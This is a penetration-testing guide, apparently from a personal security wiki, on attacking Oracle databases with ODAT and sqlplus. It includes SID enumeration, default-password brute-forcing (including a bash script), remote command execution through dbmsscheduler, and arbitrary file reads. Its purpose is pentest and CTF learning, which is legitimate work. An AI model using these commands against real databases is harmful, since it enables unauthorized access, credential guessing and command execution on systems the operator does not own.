# Oracle Databases

Oracle databases are not commonly encountered in CTF challenges, but are very common in corporate environments. Further, [versions &lt;12.1](https://docs.oracle.com/database/121/NTQRF/ap_services.htm#NTQRF700) will by default run with SYSTEM level privileges making these a very desirable attack vector.

Most of the examples here will be utilizing [ODAT ](https://github.com/quentinhardy/odat), the Oracle Database Attacking Tool. This is because it has a number of exploits and scanners built in, is generally easier to set up and more stable than metasploit, and can use a lot of metasploits wordlists and data. However, a lot will be repeated from the [wiki](https://github.com/quentinhardy/odat/wiki), so follow that if you want more in depth information. Follow the guide in the [ODAT readme](https://github.com/quentinhardy/odat) to ensure that your Kali has all the required tools.

In general I'd recommend this over trying to get Metasploit up and running. However, if you are still keen then follow [this guide](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux). For an alternative, see [Andy Gill's guide](https://blog.zsec.uk/msforacle/).  Use [oracle-instantclient](https://github.com/bumpx/oracle-instantclient) for binaries.

[PentestMonkey Oracle SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)  
[Oracle Database/SQL Cheatsheet](https://en.wikibooks.org/wiki/Oracle_Database/SQL_Cheatsheet)

## Connecting to the Database

Assuming a remote TNS listener on port 1521, we can connect to a remote database as follows:

```text
/usr/bin/sqlplus64 username/password@192.168.0.5:1521/ORCL
```

It's worth adding the `as sysdba` appended to the above command as your user may already be a database administrator, but the option to connect as one has to be explicitly set. Alternatively pass the `--sysdba` flag to ODAT when logging in:

```text
./odat.py all -s 192.168.0.5 -d ORCL -U username -P password --sysdba
```

It's highly recommended to use the `all` module when being presented with a new set of credentials, discovered either via brute-force or from another service. Running this in combination with `--test-modules` will give you a quick overview of what is and isn't possible. Use this flag with any of the below modules to ensure they work correctly.

If using ODAT, I'd also advise passing the `-vvv` flag once you ensure a module is working as it will allow you to debug the SQL commands, and see how they work behind the scenes.

## SID Enumeration

The [Oracle System Identifier](https://docs.oracle.com/cloud/latest/db112/CNCPT/startup.htm#CNCPT601) \(SID\) for Oracle identifies the database instance running on the host. These will be unique for each database instance running, and it's important to identify all SID's available, as different instances can hold different data.

We can use ODAT to enumerate these SID's and find instances to attack. These have to be explicity set in the command so it's important that you verify any one's available:

```text
./odat.py sidguesser -s 10.10.10.82
```

## Username Brute-force

Generally usernames and passwords are not case-sensitive in older Oracle databases, but as of [11g](http://planet.openbravo.com/blog/aware-oracle-11g-login-is-case-sensitive/) this is not the case. Also they are typically subject to an account lockout on too many password attempts ranging from 5 to 10, as we can see here:

```text
string = SYSTEM:0RACLE
ORA-01017: invalid username/password; logon denied
string = SYSTEM:0RACL3
ORA-01017: invalid username/password; logon denied
string = SYSTEM:ORACLE8
ORA-28000: the account is locked
```

Lucky for us it will tell us and could be used as a very basic username enumeration method if you're really really desperate. I'm joking, don't do that. Do not do that! This means you have to be very careful when enumerating database users, and I'd advise sticking to either reused credentials or default password lists specifically targeting Oracle.

We can again use ODAT to brute-force passwords:

```bash
./odat.py passwordguesser -s 192.168.0.5 -d ORCL --accounts-file accounts/accounts_multiple.txt
```

The following bash script can perform a dirty manual brute-force using sqlplus, so be sure to adjust the path's in this one accordingly:

```bash
#!/bin/bash
INPUT=/usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv
OLDIFS=$IFS
IFS=,
[ ! -f $INPUT ] && { echo "$INPUT file not found"; exit 99; }
while read comment number username password hash comment
do
 echo "string = $username:$password"
 /usr/bin/sqlplus64 -L $username\/$password\@192.168.0.5:1521\/ORCL | cut -d$'\n' -f 7 
done < $INPUT
IFS=$OLDIFS
```

**Source**: [http://carnal0wnage.attackresearch.com/2014/10/quick-and-dirty-oracle-brute-forcing.html](http://carnal0wnage.attackresearch.com/2014/10/quick-and-dirty-oracle-brute-forcing.html)

## Code Execution

There's unfortunately nothing as trivial as `xp_cmdshell` for Oracle databases, but we do have options. We can use `dbmsscheduler` in odat to execute arbitrary commands, however the results are not displayed. You'll have to use one of the many file transfer methods to fetch the output of this command.

```text
./odat.py dbmsscheduler -s 192.168.0.5 -d ORCL -U username -P password --sysdba --exec "C:\windows\system32\cmd.exe /c dir C:\\Users\\ > C:\output" -vvv
```

## Arbitrary File Read

I've found the `externaltable` to give the best results in cases like these:

```text
./odat.py externaltable --getFile C:\\Users\\Booj\\Desktop evil.jpg evil.jpg -s 192.168.0.5 -d ORCL -U username -P password --sysdba
```

However, do note that `ctxsys` can do the same, but all results are transformed to upper case:

```text
./odat.py ctxsys --getFile 'C:\\Users\\Booj\\Desktop\\evil.jpg' -s 192.168.0.5 -d ORCL -U username -P password --sysdba
```

## Further Reading

[Blackhat USA 2009 - Attacking Oracle with the Metasploit Framework](http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf) & [Paper](http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-PAPER.pdf)  
[Oracle DB Vulnerabilities: The Missing Pentester Handbook](https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/)  
[Hardening Oracle Databases](https://github.com/Reboare/virgil/tree/a351ca46a5878a5ce9a56487f86be1220237a833/h%20ttp:/www.ordba.net/Articles/HardeningOracleDB.htm)  
[Simple Oracle Privilege Escalation Techniques](http://ora-600.pl/art/oracle_privilege_escalation.pdf)  
[Simple Oracle Privilege Escalation Techniques 2](http://ora-600.pl/art/privilege_escalation_2.pdf)  
[HTB Silo Writeup by 0xEA31 - Enumeration Techniques](https://forum.hackthebox.eu/discussion/973/silo-write-up-unintended-without-odat-by-0xea31)

